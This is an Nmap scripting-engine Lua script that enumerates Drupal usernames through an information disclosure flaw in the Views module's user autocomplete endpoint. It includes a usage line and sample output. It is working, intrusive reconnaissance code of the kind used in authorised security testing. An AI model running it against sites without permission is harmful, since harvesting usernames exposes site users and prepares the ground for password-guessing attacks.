local http = require "http"
local json = require "json"
local shortport = require "shortport"
local stdnse = require "stdnse"
local table = require "table"

description = [[
Enumerates Drupal users by exploiting an information disclosure vulnerability
in Views, Drupal's most popular module.

Requests to admin/views/ajax/autocomplete/user/STRING return all usernames that
begin with STRING. The script works by iterating STRING over letters to extract
all usernames.

For more information,see:
* http://www.madirish.net/node/465
]]

---
-- @see http-vuln-cve2014-3704.nse
--
-- @usage
-- nmap --script=http-drupal-enum-users --script-args http-drupal-enum-users.root="/path/" <targets>
--
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-drupal-enum-users:
-- |   admin
-- |   alex
-- |   manager
-- |_  user
--
-- @args http-drupal-enum-users.root base path. Defaults to "/"

author = "Hani Benhabiles"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "intrusive"}


portrule = shortport.http

action = function(host, port)
  local root = stdnse.get_script_args(SCRIPT_NAME .. ".root") or "/"
  local character, allrequests,user
  local result = {}

  -- ensure that root ends with a trailing slash
  if ( not(root:match(".*/$")) ) then
    root = root .. "/"
  end

  -- characters that usernames may begin with
  -- + is space in url
  local characters = "abcdefghijklmnopqrstuvwxyz.-123456789+"

  for character in characters:gmatch(".") do
    -- add request to pipeline
    allrequests = http.pipeline_add(root.. 'admin/views/ajax/autocomplete/user/' .. character, nil, allrequests, "GET")
  end

  -- send requests
  local pipeline_responses = http.pipeline_go(host, port, allrequests)
  if not pipeline_responses then
    stdnse.debug1("No answers from pipelined requests")
    return nil
  end

  for i, response in pairs(pipeline_responses) do
    if response.status == 200 then
      local status, info = json.parse(response.body)
      if status then
        for _,user in pairs(info) do
          if user ~= "Anonymous" then
            table.insert(result, user)
          end
        end
      end
    end
  end
  return stdnse.format_output(true, result)
end
